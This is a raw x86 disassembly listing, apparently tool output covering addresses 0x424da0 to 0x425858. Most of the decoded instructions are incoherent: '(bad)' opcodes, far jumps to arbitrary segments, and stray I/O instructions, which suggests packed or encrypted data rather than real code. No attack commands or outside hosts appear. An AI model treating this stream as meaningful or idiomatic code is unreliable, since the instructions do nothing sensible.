  424da0:	sbb    eax,0x4484a7ac
  424da5:	ds sbb ebx,ebp
  424da8:	rol    DWORD PTR [ebp+0x4e1d23d1],1
  424dae:	or     BYTE PTR [edx-0x5e21b571],0x33
  424db5:	mov    dl,0xb1
  424db7:	mov    ch,0x11
  424db9:	leave  
  424dba:	call   0x6675:0x2a52841f
  424dc1:	xor    al,0x22
  424dc3:	jp     0x424e3e
  424dc5:	push   0x893d8810
  424dca:	mov    eax,gs:0xa28eb4e2
  424dd0:	or     eax,0xb2da864b
  424dd5:	imul   esi,DWORD PTR [eax+0x2203362a],0x54
  424ddc:	fldenv [edi]
  424dde:	add    al,0x75
  424de0:	ficomp WORD PTR ds:0x4480b7d3
  424de6:	retf   
  424de7:	jecxz  0x424d82
  424de9:	inc    esi
  424dea:	mov    ss,WORD PTR [ebp-0x52]
  424ded:	je     0x424df7
  424def:	icebp  
  424df0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424df1:	cld    
  424df2:	in     al,0x7
  424df4:	int3   
  424df5:	and    DWORD PTR [esi],eax
  424df7:	push   esp
  424df8:	mov    al,0xca
  424dfa:	sti    
  424dfb:	jo     0x424e65
  424dfd:	xchg   ecx,eax
  424dfe:	leave  
  424dff:	pop    edi
  424e00:	(bad)  
  424e02:	frndint 
  424e04:	daa    
  424e05:	push   eax
  424e06:	mov    esi,0xf4251a99
  424e0b:	mov    ebx,0xd289cd89
  424e10:	data16 add BYTE PTR [eax],al
	...
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e91
  424e81:	mov    bl,0x13
  424e83:	push   edx
  424e84:	mov    al,BYTE PTR gs:[ecx]
  424e87:	add    BYTE PTR ds:0xb4000001,al
  424e8d:	jbe    0x424f02
  424e8f:	aam    0x37
  424e91:	dec    ebp
  424e92:	(bad)  
  424e93:	(bad)  
  424e94:	aam    0x12
  424e96:	arpl   WORD PTR [edx],bp
  424e98:	mov    dl,ah
  424e9a:	xchg   esi,eax
  424e9b:	ja     0x424eb6
  424e9d:	in     eax,0x50
  424e9f:	jl     0x424e98
  424ea1:	jb     0x424e84
  424ea3:	mov    edi,eax
  424ea5:	cmp    ch,0x5b
  424ea8:	scas   al,BYTE PTR es:[edi]
  424ea9:	sub    esp,DWORD PTR [edx]
  424eab:	js     0x424eae
  424ead:	push   0x308b6fb4
  424eb2:	sub    al,0xcf
  424eb4:	xor    DWORD PTR [eax+0x4c1b67e2],eax
  424eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ebb:	sub    ch,BYTE PTR [edi+0x6b]
  424ebe:	mov    eax,0x54eed1
  424ec3:	ret    
  424ec4:	cs pop esi
  424ec6:	sub    ebp,DWORD PTR [ecx-0x3a680fa4]
  424ecc:	pop    esp
  424ecd:	ja     0x424ef9
  424ecf:	pushf  
  424ed0:	fstp   DWORD PTR [edx+0x503d46ec]
  424ed6:	jae    0x424f1a
  424ed8:	sbb    eax,ebx
  424eda:	vmwrite eax,DWORD PTR [ebx]
  424edd:	bound  edi,QWORD PTR [esp+esi*2]
  424ee0:	jp     0x424eb6
  424ee2:	mov    ebx,0xe8c482c5
  424ee7:	daa    
  424ee8:	add    ch,BYTE PTR [ebp+0x29]
  424eeb:	inc    esp
  424eec:	pop    ds
  424eed:	sbb    al,BYTE PTR [edx+0x62817bfc]
  424ef3:	in     al,dx
  424ef4:	and    edi,DWORD PTR [ebx-0x28]
  424ef7:	je     0x424f39
  424ef9:	and    eax,0xbce77b14
  424efe:	nop
  424eff:	call   0x6ec5bfc3
  424f04:	jecxz  0x424f2f
  424f06:	fwait
  424f07:	ins    DWORD PTR es:[edi],dx
  424f08:	clc    
  424f09:	sub    esi,DWORD PTR [esi-0x3c026b9e]
  424f0f:	pop    ebp
  424f10:	jl     0x424f75
  424f12:	push   edx
  424f13:	or     eax,esp
  424f15:	shl    BYTE PTR [edi],cl
  424f17:	mov    ebp,0xf449f798
  424f1c:	add    DWORD PTR [esi-0x237cbb2a],esi
  424f22:	dec    eax
  424f23:	xchg   edx,eax
  424f24:	jne    0x424f9e
  424f26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424f27:	mov    eax,0x52cd4962
  424f2c:	jb     0x424f92
  424f2e:	or     dh,BYTE PTR [ecx]
  424f30:	bound  edi,QWORD PTR [eax-0x49e553d4]
  424f36:	ds std 
  424f38:	pop    edx
  424f39:	inc    ebp
  424f3a:	xlat   BYTE PTR ds:[ebx]
  424f3b:	test   eax,0xecb927d
  424f40:	nop
  424f41:	clc    
  424f42:	sbb    BYTE PTR [ebx+0x7de963db],al
  424f48:	xchg   esi,eax
  424f49:	in     eax,0x43
  424f4b:	ins    DWORD PTR es:[edi],dx
  424f4c:	and    ebx,DWORD PTR [ebx-0x31]
  424f4f:	aaa    
  424f50:	(bad)  
  424f51:	stos   DWORD PTR es:[edi],eax
  424f52:	out    dx,al
  424f53:	jb     0x424fcc
  424f55:	pop    edx
  424f56:	clc    
  424f57:	mov    ecx,0x80ec5548
  424f5c:	push   edi
  424f5d:	cmp    ecx,eax
  424f5f:	std    
  424f60:	inc    eax
  424f61:	xor    DWORD PTR [edx+0x1d],esp
  424f64:	mov    ah,0xa
  424f66:	mov    al,ds:0xed028574
  424f6b:	push   esp
  424f6c:	lds    esi,FWORD PTR [esi-0x520002ee]
  424f72:	test   al,0xfb
  424f74:	imul   edi,DWORD PTR [esi+ecx*4-0x3dad69e3],0xffffffde
  424f7c:	add    eax,DWORD PTR [edx+0x69d9f1be]
  424f82:	or     ebx,ebp
  424f84:	inc    ecx
  424f85:	(bad)  
  424f86:	aad    0xa7
  424f88:	adc    ah,bl
  424f8a:	sahf   
  424f8b:	in     al,dx
  424f8c:	popf   
  424f8d:	jge    0x424f4b
  424f8f:	sti    
  424f90:	and    DWORD PTR [eax],eax
	...
  424ff2:	add    BYTE PTR [eax],al
  424ff4:	dec    ebx
  424ff5:	push   ss
  424ff6:	int    0x41
  424ff8:	fstp   st(3)
  424ffa:	iret   
  424ffb:	push   ds
  424ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ffd:	fadd   st(3),st
  424fff:	dec    eax
  425000:	and    eax,0x6a7f84a6
  425005:	mov    eax,DWORD PTR [ecx]
  425007:	add    BYTE PTR ds:0x2a000001,al
  42500d:	fwait
  42500e:	cmp    eax,0xc29a005b
  425013:	lea    edi,[eax-0x145ea3de]
  425019:	shl    ah,0xe0
  42501c:	sbb    BYTE PTR [eax+0x1c],dh
  42501f:	xchg   ebp,eax
  425020:	xor    DWORD PTR [ebx+ebp*4-0x71],ebp
  425024:	xchg   esp,eax
  425025:	push   ecx
  425026:	jmp    0x425027
  425028:	int3   
  425029:	mov    eax,0xd54890e9
  42502e:	(bad)  
  42502f:	out    dx,al
  425030:	push   edi
  425031:	shr    bl,0x52
  425034:	dec    edx
  425035:	pusha  
  425036:	dec    ebx
  425037:	scas   eax,DWORD PTR es:[edi]
  425038:	push   ebx
  425039:	test   eax,0x3b611638
  42503e:	mov    edx,0xfda1bb89
  425043:	cdq    
  425044:	or     eax,0x4338d69b
  425049:	test   eax,ebx
  42504b:	ret    0x8fd4
  42504e:	adc    eax,0x22d20af0
  425053:	sti    
  425054:	push   ecx
  425055:	mov    eax,0x127e9893
  42505a:	pop    esi
  42505b:	push   ds
  42505c:	call   0x54ac:0xbf11aa2e
  425063:	stos   BYTE PTR es:[edi],al
  425064:	add    edx,esi
  425066:	ja     0x425043
  425068:	stc    
  425069:	jo     0x42502f
  42506b:	mov    esp,0xb2972f30
  425070:	imul   esp,DWORD PTR [esi],0xaf3f642c
  425076:	ret    0xadd
  425079:	shl    BYTE PTR [esi],0x18
  42507c:	fild   WORD PTR [ebp+ebx*2+0x5e]
  425080:	push   esp
  425081:	not    BYTE PTR [ebp+0x6c]
  425084:	imul   esi,DWORD PTR [ecx-0x4e78a5ba],0x2e411f09
  42508e:	push   es
  42508f:	or     esi,DWORD PTR [ebx-0x1c]
  425092:	add    al,0xe3
  425094:	test   BYTE PTR ds:0x4423cb97,ah
  42509a:	jl     0x42505f
  42509c:	mov    eax,ds:0xcd6e645a
  4250a1:	add    DWORD PTR [esi*2+0x2d158c62],0x92e22582
  4250ac:	add    eax,0x9a03205d
  4250b1:	nop
  4250b2:	imul   ecx,DWORD PTR [esi-0x737d1f63],0x2
  4250b9:	aaa    
  4250ba:	(bad)  
  4250bb:	jnp    0x425127
  4250bd:	aam    0xcb
  4250bf:	jg     0x4250cc
  4250c1:	jmp    0x3c10:0x426cfe58
  4250c8:	ret    
  4250c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4250ca:	sbb    DWORD PTR fs:[eax-0x227625a3],ecx
  4250d1:	inc    ebp
  4250d2:	neg    DWORD PTR [ebx]
  4250d4:	(bad)  
  4250d5:	mov    dh,0xf8
  4250d7:	xor    eax,0x6cf9f41
  4250dc:	pop    ds
  4250dd:	call   0x5bf2:0x961eb6ae
  4250e4:	mov    dh,0x2c
  4250e6:	loopne 0x425101
  4250e8:	adc    eax,ecx
  4250ea:	jb     0x425166
  4250ec:	imul   esi,DWORD PTR ss:[eax+0x5b5dc3a1],0x3ef83310
  4250f7:	or     ah,ch
  4250f9:	popa   
  4250fa:	jmp    0x3859:0xce8483bd
  425101:	mov    dh,0xd8
  425103:	pop    ebx
  425104:	mov    edx,0x15db2c4f
  425109:	mov    bh,bl
  42510b:	fdiv   QWORD PTR [edi-0x2a]
  42510e:	sbb    ebp,edi
  425110:	add    BYTE PTR [eax],0x0
	...
  425173:	add    dh,bl
  425175:	adc    DWORD PTR [edi-0x15020dd],ebx
  42517b:	std    
  42517c:	out    dx,al
  42517d:	jmp    0x13ce:0x164292e8
  425184:	outs   dx,DWORD PTR ds:[esi]
  425185:	mov    WORD PTR [ecx],es
  425187:	add    BYTE PTR ds:0x14000001,al
  42518d:	add    BYTE PTR ds:0x12937c7e,ch
  425193:	shr    DWORD PTR [ebp-0x728aaaa5],cl
  425199:	sbb    al,0x5a
  42519b:	mov    edx,DWORD PTR ds:0x710f40ca
  4251a1:	shl    DWORD PTR [esi],0x3d
  4251a4:	les    edx,FWORD PTR [edi+0x3d]
  4251a7:	popf   
  4251a8:	(bad)  
  4251a9:	sti    
  4251aa:	add    ch,bh
  4251ac:	push   0xc5310dd1
  4251b1:	sti    
  4251b2:	fsubr  DWORD PTR [eax-0x7c]
  4251b5:	mov    ds:0x1e15a335,eax
  4251ba:	sar    DWORD PTR [eax+0xdee083e],0x26
  4251c1:	jnp    0x425234
  4251c3:	sar    BYTE PTR [edx],1
  4251c5:	outs   dx,DWORD PTR ds:[esi]
  4251c6:	adc    eax,0xa6fa6773
  4251cb:	push   ebx
  4251cc:	inc    esp
  4251cd:	dec    ebp
  4251ce:	and    al,0x5e
  4251d0:	leave  
  4251d1:	imul   ebp
  4251d3:	and    BYTE PTR [esi],cl
  4251d5:	retf   
  4251d6:	ds aam 0x25
  4251d9:	je     0x425244
  4251db:	adc    ah,0x68
  4251de:	iret   
  4251df:	dec    esi
  4251e0:	cmc    
  4251e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251e2:	mov    eax,ds:0x4019281
  4251e7:	xchg   ebp,eax
  4251e8:	sar    bh,1
  4251ea:	fidiv  WORD PTR [edx]
  4251ec:	sub    al,bl
  4251ee:	ret    0xba1e
  4251f1:	adc    BYTE PTR [eax+0x5690306c],0x1
  4251f8:	or     ebx,ebp
  4251fa:	push   ds
  4251fb:	push   esp
  4251fc:	mov    ds:0xd8b48c65,eax
  425201:	mov    al,ds:0x17e9d16d
  425206:	mov    bl,0x44
  425208:	aam    0xba
  42520a:	xchg   ebp,eax
  42520b:	int    0xe0
  42520d:	daa    
  42520e:	neg    DWORD PTR [edx-0x4a2bb2d8]
  425214:	and    al,0xff
  425216:	int    0x37
  425218:	arpl   WORD PTR ds:0x56f318c3,dx
  42521e:	pop    edi
  42521f:	nop
  425220:	mov    ecx,fs
  425222:	aaa    
  425223:	dec    ebp
  425224:	idiv   DWORD PTR [eax+0x11]
  425227:	push   ds
  425228:	inc    BYTE PTR [ebx]
  42522a:	mov    eax,ds:0xe3b26f05
  42522f:	mov    edx,0xf1095112
  425234:	xchg   ebx,eax
  425235:	add    eax,0xe8bb587f
  42523a:	mov    eax,0xa3259ac2
  42523f:	adc    al,0x43
  425241:	(bad)  
  425242:	pop    DWORD PTR [esi+0x2622e7b7]
  425248:	xchg   ebp,eax
  425249:	repnz enter 0x134,0x82
  42524e:	jp     0x425270
  425250:	xchg   ebx,eax
  425251:	pop    ecx
  425252:	cmp    dh,BYTE PTR [ebx-0x30]
  425255:	jmp    0x7997996e
  42525a:	fst    DWORD PTR [ebx]
  42525c:	mov    esp,0x460ddffa
  425261:	inc    ecx
  425262:	in     eax,0x4f
  425264:	xor    DWORD PTR ds:0x6e97592b,ebx
  42526a:	mov    ebp,ecx
  42526c:	push   ss
  42526d:	mov    bl,0x31
  42526f:	(bad)  
  425270:	ret    0x13e3
  425273:	(bad)  
  425274:	(bad)  
  425275:	jmp    DWORD PTR [esi+0x37]
  425278:	adc    DWORD PTR [edi+0xc],ebp
  42527b:	jmp    DWORD PTR [edi+0x4d782408]
  425281:	loopne 0x425217
  425283:	inc    edi
  425284:	and    BYTE PTR [ebp+0x67],al
  425287:	xchg   DWORD PTR [ebx],esp
  425289:	or     al,0x73
  42528b:	push   ebp
  42528c:	mov    ds:0xa0d07159,al
	...
  4252f1:	add    BYTE PTR [eax],al
  4252f3:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  4252fa:	mov    ebp,0x45495ee6
  4252ff:	icebp  
  425300:	jb     0x425323
  425302:	inc    eax
  425303:	lahf   
  425304:	je     0x425293
  425306:	add    DWORD PTR [eax],eax
  425308:	add    eax,0x8a000001
  42530d:	pusha  
  42530e:	loope  0x425296
  425310:	lock xor al,0x26
  425313:	xor    BYTE PTR [edx],ch
  425315:	push   edx
  425316:	call   0xae98:0xae2f8446
  42531d:	xchg   edi,eax
  42531e:	xchg   ebx,eax
  42531f:	cmp    al,0x42
  425321:	(bad)  
  425323:	adc    bl,BYTE PTR [edx-0x2d]
  425326:	fyl2xp1 
  425328:	cwde   
  425329:	retf   
  42532a:	ret    
  42532b:	data16 arpl di,bp
  42532e:	(bad)  
  42532f:	sbb    DWORD PTR [edx+eiz*1],esp
  425332:	xor    ebp,DWORD PTR [edx+0x1a]
  425335:	inc    esp
  425336:	adc    al,0x64
  425338:	push   edx
  425339:	add    BYTE PTR [ebp-0x2d],0x7c
  42533d:	test   al,0xcb
  42533f:	cmp    DWORD PTR [edx-0x6c468eb],0xffffffda
  425346:	add    bh,bl
  425348:	ret    0xc128
  42534b:	(bad)  
  42534c:	mov    edi,0xa6c583e5
  425351:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425352:	gs and eax,0xc18a3b51
  425358:	xchg   dl,bh
  42535a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42535b:	cwde   
  42535c:	dec    ebp
  42535d:	jmp    0xd639:0xe7398905
  425364:	xor    al,0x73
  425366:	repz jp 0x4253a9
  425369:	mov    esp,0x402b92c8
  42536e:	orps   xmm2,xmm1
  425371:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425372:	and    BYTE PTR [ebx],ch
  425374:	test   eax,0x1aa35687
  425379:	push   0x45
  42537b:	mov    eax,ds:0x25f47bd1
  425380:	xchg   ebp,eax
  425381:	outs   dx,BYTE PTR ds:[esi]
  425382:	push   ebp
  425383:	cmp    ebx,DWORD PTR [eax+0x1a12bc58]
  425389:	push   0xffffffc6
  42538b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42538c:	pop    ds
  42538d:	or     eax,DWORD PTR [ebp+0x1b9862b1]
  425393:	xchg   ecx,eax
  425394:	fsubr  DWORD PTR [ebp-0x70]
  425397:	data16 lahf 
  425399:	fs xchg ch,dl
  42539c:	jmp    0x4253af
  42539e:	std    
  42539f:	loope  0x4253be
  4253a1:	push   ecx
  4253a2:	mov    ebx,0xcdb9c11e
  4253a7:	xchg   esi,eax
  4253a8:	mov    esi,0x28fc16e0
  4253ad:	or     DWORD PTR [ebx-0x13ed368],edx
  4253b3:	aaa    
  4253b4:	jmp    0x42542b
  4253b6:	and    eax,0x9c01780a
  4253bb:	xor    cl,BYTE PTR [eax]
  4253bd:	mov    BYTE PTR [esi-0x3f],bh
  4253c0:	and    DWORD PTR [edi],edx
  4253c2:	std    
  4253c3:	add    ebx,eax
  4253c5:	sbb    eax,DWORD PTR [edi-0x2c]
  4253c8:	mov    fs,WORD PTR [ecx+0x2e22020c]
  4253ce:	inc    ecx
  4253cf:	xchg   ebp,eax
  4253d0:	cli    
  4253d1:	arpl   sp,si
  4253d3:	sbb    edi,esp
  4253d5:	jne    0x42535d
  4253d7:	fisttp DWORD PTR [edi+0x61]
  4253da:	leave  
  4253db:	cmp    DWORD PTR [esp+ebp*1-0x1b07aa87],esi
  4253e2:	lahf   
  4253e3:	aam    0x25
  4253e5:	les    ebx,FWORD PTR [ecx-0x28]
  4253e8:	pop    esp
  4253e9:	cmp    bh,BYTE PTR [ebp-0x1b]
  4253ec:	push   esp
  4253ed:	icebp  
  4253ee:	dec    eax
  4253ef:	dec    esp
  4253f0:	mov    bh,0xe4
  4253f2:	dec    eax
  4253f3:	push   ebx
  4253f4:	mov    cl,0x2b
  4253f6:	inc    ebp
  4253f7:	outs   dx,DWORD PTR ds:[esi]
  4253f8:	xchg   edi,eax
  4253f9:	pop    ebp
  4253fa:	(bad)  [edx-0x62]
  4253fd:	popf   
  4253fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4253ff:	shr    ch,1
  425401:	out    0x3c,eax
  425403:	cwde   
  425404:	cmp    BYTE PTR [esi],ch
  425406:	add    ch,bh
  425408:	cmp    al,BYTE PTR [esi]
  42540a:	pushf  
  42540b:	cmp    eax,0x22329c90
  425410:	jl     0x425412
	...
  425472:	add    BYTE PTR [eax],al
  425474:	inc    edx
  425475:	or     esp,eax
  425477:	test   eax,0xeb6fedcf
  42547c:	fcomp  DWORD PTR [edx]
  42547f:	add    ebp,DWORD PTR [esi+0x79e401c9]
  425485:	mov    es,WORD PTR [ecx]
  425487:	add    BYTE PTR ds:0xa4000001,al
  42548d:	fcmovnu st,st(1)
  42548f:	jne    0x4254aa
  425491:	into   
  425492:	es sbb dh,0x2e
  425496:	cmp    bl,BYTE PTR [edx+0x33693c19]
  42549c:	push   ebx
  42549d:	sub    edx,esi
  42549f:	mov    ?,edi
  4254a1:	icebp  
  4254a2:	sbb    dh,BYTE PTR [edi]
  4254a4:	pop    eax
  4254a5:	push   ds
  4254a6:	daa    
  4254a7:	popf   
  4254a8:	es sbb eax,0x4d8a46ae
  4254ae:	cmp    eax,0xe6afd9a3
  4254b3:	add    dh,al
  4254b5:	jecxz  0x42550f
  4254b7:	mov    bl,0x33
  4254b9:	fst    DWORD PTR [esi+edi*2-0xafd7408]
  4254c0:	arpl   WORD PTR [ebx-0x73eea34c],sp
  4254c6:	dec    ecx
  4254c7:	inc    edi
  4254c8:	mov    bl,0x8f
  4254ca:	(bad)  
  4254cb:	mov    dh,0x20
  4254cd:	cmp    DWORD PTR [ebp-0x18afc9f0],ebp
  4254d3:	add    al,0x3d
  4254d5:	imul   esi,DWORD PTR [ebp-0x757bcac1],0xf89b0364
  4254df:	or     dl,BYTE PTR [edi]
  4254e1:	push   ebx
  4254e2:	mov    eax,ds:0x879c6ad4
  4254e7:	push   cs
  4254e8:	(bad)  
  4254e9:	sub    BYTE PTR ds:0xabe3f22c,dl
  4254ef:	xor    BYTE PTR [esi-0x79525d46],bh
  4254f5:	push   esp
  4254f6:	push   edx
  4254f7:	(bad)  
  4254f8:	xchg   edx,eax
  4254f9:	sub    ecx,DWORD PTR [ebp+0x33bf9395]
  4254ff:	sbb    edi,DWORD PTR [eax]
  425501:	cwde   
  425502:	fcom   DWORD PTR [ebp-0x33]
  425505:	push   ecx
  425506:	(bad)  
  425508:	sub    eax,0xd8f4ec37
  42550d:	mov    bl,0x99
  42550f:	add    ax,0xfe63
  425513:	dec    DWORD PTR [edx-0x80]
  425516:	ds aaa 
  425518:	push   edi
  425519:	sti    
  42551a:	sbb    eax,0xf6e7c7d5
  42551f:	pop    ds
  425520:	mov    edx,0xa8f4efbc
  425525:	outs   dx,BYTE PTR ds:[esi]
  425526:	pop    ebp
  425527:	sar    BYTE PTR [esp+esi*2],cl
  42552a:	pusha  
  42552b:	mov    ds:0x29578693,eax
  425530:	xchg   esi,eax
  425531:	mov    ds,WORD PTR [ecx-0x57f8a99f]
  425537:	jmp    0xd02c4c3
  42553c:	call   0x479b2aaa
  425541:	mov    dh,0x62
  425543:	fmul   DWORD PTR [ebx]
  425545:	test   eax,0x74d627b
  42554a:	rol    DWORD PTR [esi+0x66ac47e],0x54
  425551:	or     ah,BYTE PTR [edx]
  425553:	sbb    al,0xcb
  425555:	stos   DWORD PTR es:[edi],eax
  425556:	inc    al
  425558:	(bad)  
  425559:	psubd  mm7,QWORD PTR [ecx+0x5f]
  42555d:	push   eax
  42555e:	nop
  42555f:	aaa    
  425560:	and    edi,DWORD PTR [edx-0x5d50720c]
  425566:	fadd   QWORD PTR [edi+0x5dc99f48]
  42556c:	lock leave 
  42556e:	sbb    eax,DWORD PTR [edi-0x3e]
  425571:	and    DWORD PTR [eax-0x375790df],ebp
  425577:	dec    esi
  425578:	cmp    dh,bl
  42557a:	add    DWORD PTR [esi-0x7d],ebx
  42557d:	imul   edi,DWORD PTR [ebx+0x4d14559b],0xfffffff8
  425584:	(bad)  
  425585:	scas   eax,DWORD PTR es:[edi]
  425586:	jle    0x4255fa
  425588:	xor    al,0x1f
  42558a:	rol    BYTE PTR [eax-0x24],1
  42558d:	xor    esp,DWORD PTR [ecx+0x8c5e]
	...
  4255f3:	add    ah,al
  4255f5:	jmp    0xfef4:0xfe6e7a4e
  4255fc:	dec    ebp
  4255fd:	mov    esi,0x91caf13a
  425602:	fisub  DWORD PTR [esi+edi*2]
  425605:	pop    DWORD PTR [ecx]
  425607:	add    BYTE PTR ds:0x7f000001,al
  42560d:	cmc    
  42560e:	shl    eax,0xf1
  425611:	lea    ebx,[eax-0x45]
  425614:	xor    esi,DWORD PTR [esi+0x4a]
  425617:	rcl    esp,1
  425619:	xor    BYTE PTR [ebp+0x5d],ch
  42561c:	imul   BYTE PTR [edx-0x7b]
  42561f:	mov    bh,0x2e
  425621:	in     al,dx
  425622:	xchg   esp,eax
  425623:	jae    0x425633
  425625:	push   ss
  425626:	xchg   ecx,eax
  425627:	xchg   ebx,eax
  425628:	and    esp,edi
  42562a:	(bad)  
  42562b:	jmp    0xc42b:0xdf669b9a
  425632:	dec    esi
  425633:	sbb    ecx,DWORD PTR [eax]
  425635:	dec    esp
  425636:	push   esi
  425637:	mov    ecx,0x55dbb11f
  42563c:	cli    
  42563d:	sbb    DWORD PTR [ecx-0xe5635b5],0xffffffc4
  425644:	pop    esp
  425646:	xchg   esi,eax
  425647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425648:	pop    edx
  425649:	idiv   bh
  42564b:	(bad)  
  42564c:	sub    eax,0x8c7d0cc5
  425651:	loop   0x42567f
  425653:	dec    edx
  425654:	pusha  
  425655:	fsub   st,st(3)
  425657:	popa   
  425658:	fbld   TBYTE PTR [edx-0x3e]
  42565b:	sbb    BYTE PTR [ecx+0x81a3a2b],0x22
  425662:	cmp    al,0xc0
  425664:	(bad)  
  425665:	stc    
  425666:	enter  0x9f5,0xd0
  42566a:	fild   DWORD PTR [esi+0x7f]
  42566d:	fdivr  st,st(7)
  42566f:	sbb    eax,DWORD PTR [ecx+0xd]
  425672:	push   esi
  425673:	mov    cl,BYTE PTR [ecx]
  425675:	imul   ebp,DWORD PTR [esi],0xc9c32553
  42567b:	push   edx
  42567c:	jl     0x4256fc
  42567e:	push   edi
  42567f:	imul   ecx,DWORD PTR [ebx],0x22
  425682:	cmc    
  425683:	add    DWORD PTR [ebx+0x2575d457],eax
  425689:	in     al,0x42
  42568b:	shl    DWORD PTR [edx+edi*2-0x58],0xed
  425690:	sbb    DWORD PTR [ecx-0xe],esp
  425693:	dec    ebx
  425694:	xchg   edi,eax
  425695:	jnp    0x42567e
  425697:	adc    ebx,0x6c7987f1
  42569d:	lock xor DWORD PTR [edx],ebx
  4256a0:	in     al,0x6e
  4256a2:	out    dx,eax
  4256a3:	mov    BYTE PTR [esp+edx*8],dl
  4256a6:	scas   eax,DWORD PTR es:[edi]
  4256a7:	fs fsubp st(1),st
  4256aa:	cmc    
  4256ab:	add    BYTE PTR [edi],dh
  4256ad:	jmp    0x82c06ef2
  4256b2:	inc    edx
  4256b3:	aad    0x13
  4256b5:	inc    ecx
  4256b6:	inc    edi
  4256b7:	sbb    BYTE PTR [ebp-0x73],0xb5
  4256bb:	mov    ds:0x46131c75,eax
  4256c0:	add    BYTE PTR [esi-0x6700f922],dl
  4256c6:	push   ecx
  4256c7:	outs   dx,DWORD PTR ds:[esi]
  4256c8:	add    DWORD PTR [esi],ebx
  4256ca:	xchg   ebp,eax
  4256cb:	addr16 dec ebp
  4256cd:	dec    eax
  4256ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256cf:	fdivrp st(6),st
  4256d1:	into   
  4256d2:	pop    ebp
  4256d3:	cmp    edx,DWORD PTR [eax]
  4256d5:	push   ecx
  4256d6:	xchg   DWORD PTR [eax-0x33],ecx
  4256d9:	stos   DWORD PTR es:[edi],eax
  4256da:	loopne 0x42568f
  4256dc:	and    ecx,edx
  4256de:	mov    ch,BYTE PTR [ebx+0x124f7278]
  4256e4:	rcl    DWORD PTR [ecx-0x37],cl
  4256e7:	in     eax,dx
  4256e8:	aas    
  4256e9:	repz hlt 
  4256eb:	and    eax,0xa77634fb
  4256f0:	mov    ds:0xed9fc899,eax
  4256f5:	or     cl,bh
  4256f7:	shl    BYTE PTR [ecx],0xac
  4256fa:	jo     0x4256f4
  4256fc:	setp   cl
  4256ff:	jnp    0x425741
  425701:	pushf  
  425702:	or     al,BYTE PTR [ebp+0x3f]
  425705:	mov    esi,0xfca355f3
  42570a:	sbb    BYTE PTR [eax+0xb],0xcd
  42570e:	push   esi
  42570f:	in     al,dx
  425710:	jg     0x425712
	...
  425772:	add    BYTE PTR [eax],al
  425774:	(bad)  
  425775:	aaa    
  425776:	shl    BYTE PTR [ebx+esi*8],cl
  425779:	cmc    
  42577a:	div    bh
  42577c:	test   DWORD PTR [edi+0x3f],0xa6433e74
  425783:	add    DWORD PTR [ebx+0x5000190],0x1
  42578a:	add    BYTE PTR [eax],al
  42578c:	mov    eax,ds:0x6acb2c85
  425791:	mov    edi,0xce3d69a5
  425796:	rcl    BYTE PTR [ecx+0x62],0xdb
  42579a:	sbb    DWORD PTR ds:0x24fe46f6,edi
  4257a0:	lock and cl,BYTE PTR [edi+0x64]
  4257a4:	mov    edi,0xb7737c21
  4257a9:	aas    
  4257aa:	leave  
  4257ab:	adc    BYTE PTR [edi+0x2f949fb5],0x63
  4257b2:	into   
  4257b3:	in     eax,dx
  4257b4:	fsub   DWORD PTR [ebp+0x4f]
  4257b7:	push   ss
  4257b8:	push   ecx
  4257b9:	push   edi
  4257ba:	fnstsw WORD PTR [ebx+0xe]
  4257bd:	fnstenv [ebx-0x227d361]
  4257c3:	mov    ah,0x50
  4257c5:	ins    DWORD PTR es:[edi],dx
  4257c6:	jb     0x425789
  4257c8:	xchg   esp,eax
  4257c9:	inc    edx
  4257ca:	loopne 0x425782
  4257cc:	sbb    edx,ebx
  4257ce:	pop    es
  4257cf:	sar    edi,1
  4257d1:	adc    edi,DWORD PTR [ecx+0x3ad51550]
  4257d7:	mov    BYTE PTR [ecx+0x5c48711d],dl
  4257dd:	imul   ecx
  4257df:	add    DWORD PTR [ebx-0x47458005],esp
  4257e5:	(bad)  
  4257e6:	push   ebp
  4257e7:	pop    ds
  4257e8:	(bad)  
  4257e9:	pop    ds
  4257ea:	(bad)  
  4257eb:	aam    0xa0
  4257ed:	pop    es
  4257ee:	xor    ecx,eax
  4257f0:	sub    dl,BYTE PTR [ecx+0x750a45ae]
  4257f6:	or     ah,BYTE PTR [ebx-0x178565dc]
  4257fc:	lea    edx,[ebx+0x2d]
  4257ff:	mov    ?,WORD PTR [ebp+0x7c]
  425802:	jb     0x425822
  425804:	scas   eax,DWORD PTR es:[edi]
  425805:	jecxz  0x4257d2
  425807:	jmp    0xec48:0xb0dbe602
  42580e:	pop    ecx
  42580f:	js     0x425812
  425811:	xchg   BYTE PTR [eax+0x3691c677],dl
  425817:	inc    esp
  425818:	cdq    
  425819:	inc    eax
  42581a:	nop
  42581b:	pushf  
  42581c:	adc    cl,BYTE PTR [edi-0x2e8f79ef]
  425822:	pop    ss
  425823:	cmp    DWORD PTR [ebx+0x26],eax
  425826:	push   ebp
  425827:	fisub  WORD PTR [edx]
  425829:	mov    ch,0x4e
  42582b:	retf   0x1257
  42582e:	sbb    DWORD PTR [ebp-0x4274c694],ebp
  425834:	cmp    ebx,DWORD PTR [esi]
  425836:	aaa    
  425837:	and    ch,ah
  425839:	gs push ebx
  42583b:	imul   ebp,eax,0x4d
  42583e:	test   al,0xa0
  425840:	mov    DWORD PTR [ebp-0x2a40fce],eax
  425846:	adc    BYTE PTR [ebx+0x77bd3e67],0xfe
  42584d:	inc    edx
  42584e:	inc    edx
  42584f:	add    edx,DWORD PTR fs:[edx-0x5f]
  425853:	pusha  
  425854:	cmc    
  425855:	(bad)  
  425856:	mov    cs,WORD PTR [ecx]
  425858:	push   eax
